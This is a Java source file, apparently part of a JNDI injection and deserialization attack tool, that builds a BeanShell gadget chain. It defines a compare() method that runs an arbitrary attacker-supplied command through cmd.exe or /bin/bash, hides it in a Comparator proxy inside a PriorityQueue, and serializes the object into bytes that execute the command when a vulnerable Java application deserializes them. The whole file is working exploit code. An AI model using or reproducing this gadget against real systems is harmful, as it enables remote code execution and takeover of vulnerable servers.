package sonomon.jndi.deser.gadgets;

import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Method;
import java.lang.reflect.Proxy;
import java.util.Comparator;
import java.util.PriorityQueue;
import sonomon.jndi.deser.Deserialize;
import sonomon.jndi.deser.MyURLClassLoader;
import sonomon.jndi.factory.FactoryUtils;

public class Bsh implements SerializeObject{
	
    public Object getJavaSerializeObject(String payload, String jarname) throws Exception {
    	MyURLClassLoader classLoader = new MyURLClassLoader(jarname);
        Class xthisclass = classLoader.loadClass("bsh.XThis");
        
//        ObjectStreamClass osc1 = ObjectStreamClass.lookup(xthisclass);
//        System.out.println(osc1.getSerialVersionUID());
        
        Class namespacecclass = classLoader.loadClass("bsh.NameSpace");
        Class interpreterclass = classLoader.loadClass("bsh.Interpreter");
    	Object interpreter = interpreterclass.newInstance();
    	
    	String func = "isWin = java.lang.System.getProperty(\"os.name\").toLowerCase().contains(\"win\");"
    			+ "compare(Object foo, Object bar) {if(isWin){new java.lang.ProcessBuilder(new String[]{\"cmd.exe\",\"/c\",\""+payload+"\"}).start();}"
    			+ "else{new java.lang.ProcessBuilder(new String[]{\"/bin/bash\",\"-c\",\""+payload+"\"}).start();}"
    			+ "return new Integer(1);}";
    	
    	//覆盖bsh.cwd,清空user.dir，防止信息泄露
        Method setu = interpreter.getClass().getDeclaredMethod("setu",new Class[]{String.class,Object.class});
    	setu.setAccessible(true);
    	setu.invoke(interpreter,new Object[]{"bsh.cwd","."});
    	
    	interpreterclass.getMethod("eval", String.class).invoke(interpreter, func);
        Object xt = xthisclass.getDeclaredConstructor(namespacecclass,interpreterclass).newInstance(interpreterclass.getMethod("getNameSpace").invoke(interpreter), interpreter);
        InvocationHandler handler = (InvocationHandler) Deserialize.getFieldValue(xt, "invocationHandler").get(xt);
        Comparator proxy = (Comparator) Proxy.newProxyInstance(Comparator.class.getClassLoader(),new Class[]{Comparator.class}, handler);
        final PriorityQueue pq = new PriorityQueue();
        pq.add(1);
        pq.add(2);
        Deserialize.setFieldValue(pq, "comparator", proxy);
        return pq;
    }
	public byte[] getJavaSerializeData(String payload, String jarname) throws Exception {
		byte[] bs = FactoryUtils.objectToBytes(getJavaSerializeObject(payload, jarname));
		return bs;
	}
}